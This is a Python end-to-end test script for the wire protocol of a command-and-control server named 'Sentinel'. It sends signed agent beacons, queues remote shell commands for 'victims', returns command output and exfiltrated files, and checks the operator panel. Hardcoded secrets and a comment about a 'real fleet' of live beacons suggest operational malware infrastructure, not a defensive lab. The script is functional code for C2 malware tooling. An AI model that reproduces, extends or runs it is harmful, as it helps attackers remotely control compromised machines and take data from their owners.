#!/usr/bin/env python3
"""End-to-end proof of the Sentinel C2 wire protocol.

Runs the same sequence a real agent runs - signed beacon, command pickup,
signed result - against a running console, then confirms the operator side
saw it. This is the harness that proves the protocol before the agent is
rewritten to speak it.
"""
import hashlib
import hmac
import json
import os
import sys
import time
import urllib.error
import urllib.request

BASE = os.environ.get("C2", "http://127.0.0.1:10099")
SECRET = os.environ.get("AGENT_SECRET", "7c1f9e2b4a8d6f0c3e5a7b9d1f3h5j7l")
PASS = os.environ.get("PANEL_PASS", "3001")
AGENT = os.environ.get("AGENT_ID", "bench-agent-01")

ok = 0
fail = 0


def check(name, cond, detail=""):
    global ok, fail
    if cond:
        ok += 1
        print("  PASS  " + name)
    else:
        fail += 1
        print("  FAIL  " + name + ("  " + detail if detail else ""))


def call(path, body=None, headers=None, method=None, raw=False):
    data = None
    hdrs = dict(headers or {})
    if body is not None:
        data = body.encode("utf-8") if isinstance(body, str) else body
        hdrs.setdefault("content-type", "application/json")
    req = urllib.request.Request(BASE + path, data=data, headers=hdrs,
                                 method=method or ("POST" if data else "GET"))
    try:
        with urllib.request.urlopen(req, timeout=25) as r:
            payload = r.read()
            return r.status, payload if raw else json.loads(payload or b"{}"), r.headers
    except urllib.error.HTTPError as e:
        payload = e.read()
        try:
            return e.code, json.loads(payload or b"{}"), e.headers
        except Exception:
            return e.code, {"raw": payload.decode("utf-8", "replace")}, e.headers


def sign(agent_id, ts, body):
    msg = (agent_id + "." + str(ts) + "." + body).encode("utf-8")
    return hmac.new(SECRET.encode("utf-8"), msg, hashlib.sha256).hexdigest()


def beacon(info, agent=AGENT):
    body = json.dumps(info)
    ts = int(time.time())
    return call("/api/beacon", body, {
        "x-agent-id": agent,
        "x-agent-ts": str(ts),
        "x-agent-sig": sign(agent, ts, body),
    })


def result(msg, agent=AGENT):
    body = json.dumps(msg)
    ts = int(time.time())
    return call("/api/result", body, {
        "x-agent-id": agent,
        "x-agent-ts": str(ts),
        "x-agent-sig": sign(agent, ts, body),
    })


def main():
    print("sentinel c2 protocol check -> " + BASE)

    print("\n1. operator login")
    status, data, hdrs = call("/api/login", json.dumps({"pass": PASS}))
    check("login accepted", status == 200 and data.get("ok"), str(data))
    cookie = (hdrs.get("set-cookie") or "").split(";")[0]
    check("session cookie issued", cookie.startswith("sid="), cookie)
    auth = {"cookie": cookie}

    status, data, _ = call("/api/login", json.dumps({"pass": "wrong"}))
    check("wrong password rejected", status == 403, str(status))

    print("\n2. agent beacon (signed)")
    info = {
        "host": "DESKTOP-NGA6TPR", "user": "olivia", "os": "Windows 11 Pro 26H2",
        "country": "FR", "admin": True, "version": "1.4.2", "ping": 41,
        "window": "Visual Studio Code", "tag": "bench",
    }
    status, data, _ = beacon(info)
    check("beacon accepted", status == 200 and data.get("ok"), str(data))
    check("empty queue returns no commands", data.get("commands") == [], str(data))

    print("\n3. beacon rejected when tampered")
    body = json.dumps(info)
    ts = int(time.time())
    status, data, _ = call("/api/beacon", body, {
        "x-agent-id": AGENT, "x-agent-ts": str(ts), "x-agent-sig": "00" * 32})
    check("bad signature refused", status == 401, str(status))
    status, data, _ = call("/api/beacon", body, {
        "x-agent-id": AGENT, "x-agent-ts": str(int(time.time()) - 4000),
        "x-agent-sig": sign(AGENT, int(time.time()) - 4000, body)})
    check("stale timestamp refused", status == 401, str(status))

    print("\n4. operator queues a command")
    status, data, _ = call("/api/queue", json.dumps({"vid": AGENT, "verbs": [
        {"verb": "shell", "args": "whoami /priv"}, {"verb": "info", "args": ""}]}), auth)
    check("queue accepted", status == 200 and data.get("ok"), str(data))
    check("two commands created", len(data.get("ids", [])) == 2, str(data))

    print("\n5. agent picks the queue up")
    status, data, _ = beacon(info)
    cmds = data.get("commands") or []
    check("two commands delivered", len(cmds) == 2, str(cmds))
    check("first is the shell command", cmds and cmds[0]["verb"] == "shell", str(cmds))

    status, data, _ = beacon(info)
    check("queue drained, not redelivered", data.get("commands") == [], str(data))

    print("\n6. agent returns results")
    status, data, _ = result({
        "id": cmds[0]["id"], "exit": 0,
        "output": "PRIVILEGES INFORMATION\nSeDebugPrivilege   Debug programs   Enabled",
        "files": [{"name": "whoami.txt", "bytes": 21,
                   "data": "UFJJVklMRUdFUyBJTkZP"}]})
    check("result accepted", status == 200 and data.get("ok"), str(data))

    print("\n7. operator side reflects it")
    status, data, _ = call("/api/victims", headers=auth)
    row = next((v for v in data.get("victims", []) if v["id"] == AGENT), None)
    check("victim listed", row is not None, str(data)[:200])
    if row:
        check("host recorded", row["host"] == "DESKTOP-NGA6TPR", str(row))
        check("admin flag recorded", row["admin"] is True, str(row))
        check("queue counter back to zero", int(row["queued"]) == 0, str(row))

    status, data, _ = call("/api/history?vid=" + AGENT, headers=auth)
    done = [c for c in data.get("commands", []) if c["id"] == cmds[0]["id"]]
    check("output stored", done and "SeDebugPrivilege" in (done[0]["output"] or ""), str(done)[:200])

    status, data, _ = call("/api/uploads?vid=" + AGENT, headers=auth)
    check("upload recorded", data.get("uploads") and data["uploads"][0]["name"] == "whoami.txt",
          str(data)[:200])
    if data.get("uploads"):
        status, blob, _ = call("/api/download?id=" + str(data["uploads"][0]["id"]),
                               headers=auth, raw=True)
        check("upload downloads back", blob == b"PRIVILEGES INFO", str(blob))

    print("\n8. unauthenticated access refused")
    status, _, _ = call("/api/victims")
    check("victims require auth", status == 401, str(status))
    status, _, _ = call("/api/queue", json.dumps({"vid": AGENT, "verb": "shell", "args": "x"}))
    check("queue requires auth", status == 401, str(status))

    print("\n9. cleanup")
    status, data, _ = call("/api/remove", json.dumps({"vid": AGENT}), auth)
    check("victim removed", status == 200 and data.get("ok"), str(data))
    status, data, _ = call("/api/victims", headers=auth)
    # Only the harness agent must be gone. The real fleet stays: asserting an
    # empty grid only passed on a virgin database and failed every run after the
    # first live beacon registered.
    remaining = [v.get("id") for v in (data.get("victims") or [])]
    check("harness agent gone", AGENT not in remaining, str(remaining)[:200])

    print("\n%d passed, %d failed" % (ok, fail))
    return 0 if fail == 0 else 1


if __name__ == "__main__":
    sys.exit(main())
